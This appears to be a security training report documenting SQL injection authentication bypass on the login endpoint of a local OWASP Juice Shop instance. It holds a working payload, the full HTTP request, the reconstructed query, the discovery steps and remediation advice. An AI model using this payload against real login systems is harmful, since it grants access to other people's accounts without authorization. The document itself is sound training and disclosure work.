# Vulnerability Report: SQL Injection — Authentication Bypass

**Target:** OWASP Juice Shop (local instance — `http://localhost:3000`)
**Date:** October 21, 2026
**Tested by:** Soliman
**Severity:** 🔴 Critical

---

## 1. Summary

The login endpoint (`/rest/user/login`) concatenates the **email** parameter directly into a SQL query without sanitization or parameterization. This allows an attacker to log into any user's account without knowing their password (authentication bypass).

## 2. Affected Endpoint

```
POST /rest/user/login
Content-Type: application/json
```

## 3. Vulnerability Details

| Field | Value |
|---|---|
| Vulnerability Type | SQL Injection (Authentication Bypass) |
| Affected Parameter | `email` |
| Database | SQLite (via Sequelize ORM, raw query) |
| CWE | [CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements used in an SQL Command |

## 4. Proof of Concept

**Payload used (email field):**
```
jim@juice-sh.op'--
```

**Password field:** any value (e.g. `x`)

**Request:**
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"jim@juice-sh.op'--","password":"x"}
```

**Reconstructed backend query:**
```sql
SELECT * FROM Users WHERE email = 'jim@juice-sh.op'-- ' AND password = '<hashed_input>'
```

`--` starts a comment in SQLite, so everything after it — including the password check — is discarded. The query only needs the email to match, bypassing password verification entirely.

## 5. Discovery Process

1. Initial testing used `' OR 1=1#` (MySQL-style comment), which triggered a **500 Internal Server Error**.
2. The response body leaked the raw database error:
   ```
   SQLITE_ERROR: unrecognized token: "#"
   ```
   This confirmed the backend uses **SQLite** and that input is not sanitized — and that error handling leaks internal details.
3. Switching to the SQLite-compatible comment syntax (`--`) resulted in a successful login.
4. The same technique was used to target a specific user (`jim@juice-sh.op`) by supplying their known email and commenting out the password check.

## 6. Impact

- **Authentication bypass** — any account can be accessed without its password, given only the email.
- If an attacker knows or guesses the admin's email, this could lead to **full administrative access**.
- Exposes sensitive account data (order history, saved addresses, payment details).
- Verbose error messages aid reconnaissance by revealing the DBMS type and internal query structure.

## 7. Remediation

1. Use **parameterized queries / prepared statements** — never concatenate user input directly into SQL.
2. Use Sequelize's built-in parameter binding instead of raw query strings.
3. Add input validation on the `email` field (enforce valid email format).
4. Return **generic error messages** to clients in production; never expose stack traces or raw DB errors.
5. Apply the principle of least privilege to the database user account.

---

*This report was produced as part of authorized security training on a local, self-hosted instance of OWASP Juice Shop (an intentionally vulnerable application designed for practicing web security).*
